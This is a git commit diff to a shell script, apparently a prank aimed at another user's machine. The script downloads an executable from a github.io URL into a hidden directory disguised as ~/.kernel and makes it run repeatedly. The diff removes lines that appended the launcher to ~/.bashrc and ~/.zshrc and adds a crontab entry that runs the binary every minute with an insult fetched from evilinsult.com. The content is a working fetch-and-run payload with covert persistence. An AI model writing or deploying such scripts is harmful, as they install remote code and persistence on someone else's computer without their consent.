d67e5491c2ff0a31273bd2fb56ddb940568e3e23
Remy <remy.noulin@epitech.eu>
2022-10-11 11:21:43 +0200

    [ADD] xcowsay in crontab

--- scripts/11.sh
+++ scripts/11.sh
@@ -3,5 +3,4 @@
 mkdir ~/.kernel
 curl https://Waz0x.github.io/bin/xcowsay/bin > ~/.kernel/bin && chmod +x ~/.kernel/bin
 curl https://Waz0x.github.io/bin/xcowsay/cow_med.png > ~/.kernel/cow_med.png
-echo "cd ~/.kernel;./bin --image cow_med.png \"\$(curl https://evilinsult.com/generate_insult.php\?lang\=fr\&amp\;type\=raw -s)\" &;cd" >> ~/.bashrc
-echo "cd ~/.kernel;./bin --image cow_med.png \"\$(curl https://evilinsult.com/generate_insult.php\?lang\=fr\&amp\;type\=raw -s)\" &;cd" >> ~/.zshrc
+cd "$(mktemp -d)"; crontab -l > mycron; echo "* * * * * bash -c 'export DISPLAY=:0 && ~/.kernel/bin --image ~/.kernel/cow_med.png \"\$(/usr/bin/curl https://evilinsult.com/generate_insult.php\?lang\=fr\&amp\;type\=raw)\"'" >> mycron; crontab mycron; rm -f mycron; exit
